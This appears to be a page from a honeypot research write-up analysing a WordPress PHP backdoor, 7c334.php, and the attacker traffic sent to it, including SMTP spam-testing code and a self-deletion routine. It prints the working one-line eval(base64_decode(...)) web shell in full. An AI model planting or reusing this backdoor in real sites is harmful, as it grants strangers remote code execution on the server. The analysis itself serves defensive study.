@@ -1,0 +1,167 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>PHParasites:  WordPress Malware</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="google-site-verification" content="ixC4wtdetOlWNosRSwl6CFgRutGwfbq_9r9z534uRkY" />
+<style type="text/css">
+html,body{margin:0;padding:0}
+body{font: 76% arial,sans-serif}
+p{margin:0 10px 10px}
+div#header h1{height:80px;line-height:80px;margin:0; padding-left:10px;background: #EEE;color: #79B30B}
+div#subheader h2{height:15px;line-height:15px;margin:5px; padding-left:10px;color: #79B30B}
+div#subsubheader h3{height:10px;line-height:10px;margin:5px; padding-left:12px;color: #79B30B}
+div#content p{line-height:1.4}
+div#content pre{line-height:1.4;margin:5px;font:100% courier;}
+div#content kbd{font:100% courier;}
+div#navigation{background:#B9CAFF}
+div#extra{background:#FF8539}
+div#footer{background: #333;color: #FFF}
+div#footer p{margin:0;padding:5px 10px}
+div#wrapper{float:left;width:100%}
+div#content{margin: 0 25%}
+div#navigation{float:left;width:25%;margin-left:-100%}
+div#extra{float:left;width:25%;margin-left:-25%}
+div#footer{clear:left;width:100%}
+</style>
+</head>
+<body>
+<div id="container">
+<div id="header">
+	<h1>PHParasites:  WordPress Malware</h1>
+</div>
+<div id="wrapper">
+<div id="content">
+<div id="subheader"><h2>7c334.php: World's Simplest Backdoor</h2></div>
+<p>
+Another WSO download, <kbd>7c334.php</kbd> consists entirely of the following:
+</p>
+<pre>
+&lt;?php if(isset($_POST["cod\x65"])){eval(base64_decode($_POST["co\x64e"]));}^M
+?&gt;
+</pre>
+<p>
+This is only slight obfuscated, but it has the advantage of not leaving on disk a copy of the
+<em>malicious</em> PHP, the PHP executed by the <kbd>eval(base64_decode(...))</kbd>.
+Note that it only works correctly with HTTP POST requests, and further, requests
+with a parameter named <kbd>code</kbd> and an associated value.
+</p>
+<p>
+91.197.19.103 uploaded the backdoor code 6 times between
+2013-07-03T04:40:15-06 and 2013-07-03T04:49:38-06.
+On 2013-07-16T13:57:04-06, 91.197.19.103 tried to delete
+the backdoor code via
+the <a href="wso.html#ACTIONPHP">"Php" action of WSO</a>.
+The <a href="delete_7c334.phps">PHP deletion code</a> arrives in a HTTP POST
+request, and WSO executes it via the <kbd>eval()</kbd> construct.
+The code is thorough, it starts at "/" and works its way down
+the filesystem until it finds <kbd>7c334.php</kbd> and unlinks it.
+The code is specific to Linux, but that may not mean anything.
+WSO tells you what operating system it's running on, so you could
+send a Linux-specific version to Linux systems, and a Windows-specific
+version to Windows.
+If the deletion code executes successfully, the result is the phrase "eval_ok".
+I did not emulate the "Php" action in WSO, so this chunk of code just
+got saved, and did not return "eval_ok".
+It does seem that not leaving a trace on disk is a priority to the
+people installing and using this backdoor.
+</p>
+<p>
+Eight different IP addresses (none of them the IP address that uploaded the gateway)
+tried to execute 3 distinct pieces of PHP via this backdoor.
+<div id="subsubheader"><h3>SMTP Tester 1</h3></div>
+<p>
+Someone attempted to use the backdoor to run an STMP test.  They sent an HTTP
+POST that got the 7c334 PHP code to <kbd>eval</kbd> an <a
+href="smtp.recon1.phps">SMTP spamming program</a>.  The spamming program would
+try to send an email with the body text <kbd>Validation
+success:#43d42cd13ec809071976366def5b135c#</kbd> to 30 different SMTP
+addresses, mostly in the UK. The eval'ed code is clearly a spamming
+tool, as it allows for multiple destination addresses for the message body,
+fakes a source address, and picks a random string as a fake mail user agent
+name.  In this case, it was used for reconnaisance.
+</p>
+<p>
+The POST requests for <kbd>7c334.php</kbd> that contain the SMTP tester code
+also contain name/value pairs used by the tetser code when it executes. The
+name/value pairs include the "from" email address, a list of "to" email
+addresses, a message body, and a subject line. All of the values are
+base64-encoded, but the names ("theme", "message", "from", "emails", "mailers")
+are not. The name/value pairs include a "verbose" name and corrsponding value,
+which is never used. Several functions (<kbd>text_macros()</kbd>,
+<kbd>alter_macros()</kbd>, <kbd>xnum_macros()</kbd>) appear, but are never
+called.  All this lends a slapdash feel to the code, as if someone created this
+code by stripping down a larger program, but didn't quite finish the job.
+</p>
+<div id="subsubheader"><h3>SMTP Tester 2</h3></div>
+<p>
+The eval'ed code for <a href="smtp.recon2.phps">this SMTP tester</a>
+is mostly the open source <a href="">PHPMailer class</a>.
+It looks like a concatenation of <kbd>class.smtp.php</kbd>,
+<kbd>class.html2text.inc</kbd> and <kbd>class.phpmailer.php</kbd>
+from the source code of that project, with all comments
+stripped. Various <kbd>$Version</kbd>
+variables place it at version 5.2.6 of PHPMailer.
+</p>
+<p>
+PHPMailer is overkill for what this tester does: contact <kbd>smtp.gmail.com</kbd>
+and try SMTP "EHLO" and "HELO" commands. Only a very few PHPMailer member functions
+get called. On the other hand, the tester code does try TCP ports 25, 465 and 587,
+keeping up the grand tradition of malware trying every difficult operation
+multiple times.
+</p>
+<div id="subsubheader"><h3>Just give me some output, any output!</h3></div>
+<p>
+<kbd>echo "sadfasdfasdfasdf";</kbd>
+</p>
+<p>
+The "echo" code was the last time someone tried to execute something
+on my honey pot via <kbd>7c334.php</kbd>. It may constitute a manual attempt
+at figuring out what was going wrong, since my 7c334 emulation didn't actually
+eval any PHP sent its way.
+</p>
+</div>
+</div>
+
+<div id="navigation">
+<div id="subheader"><h2>Sections</h2></div>
+<ul>
+	<li><a href="index.html">Introduction</a>.</li>
+	<li><a href="details.html">Honey Pot Details</a></li>
+	<li><a href="access.html">Obtaining Access</a></li>
+	<li><a href="comment_spam.html">Spam Posts</a></li>
+	<li><a href="wso.html">WSO Web Shell</a></li>
+	<li><a href="login.html">WSO Session Example</a></li>
+	<li><a href="emailers.html">Email Spam Tools</a></li>
+	<li><a href="recon.html">Reconnaissance Tools</a></li>
+	<li><a href="gateway.html">File Retrieval Gateway</a></li>
+	<li><a href="testm.html">Obfuscated Code Champion</a></li>
+	<li>Back Doors</li>
+</ul>
+</div>
+
+<div id="extra">
+<div id="subheader"><h2>Author</h2></div>
+<p>
+<a href="mailto:bediger@stratigery.com">Bruce Ediger</a>, October, 2013.
+</p>
+<div id="subheader"><h2>PHP Code Sent to 7c334.php</h2></div>
+<p>
+<a href="smtp.recon1.phps">SMTP Tester 1</a>.
+</p>
+<p>
+<a href="smtp.recon2.phps">SMTP Tester 2</a>.
+</p>
+<div id="subheader"><h2>Emulation Code</h2></div>
+<p>
+<a href="fake_7c334.phps">Fake SMTP Tester 1</a>
+</p>
+<div id="subheader"><h2>Related PHP Code</h2></div>
+<p>
+<a href="delete_7c334.phps">Code to delete 7c334.php</a>
+</p>
+</div>
+<div id="footer"><p>Up to Bruce Ediger's <a style="color:white;" href="/">Web pages</a>.</p></div>
+</div>
+</body>
+</html>
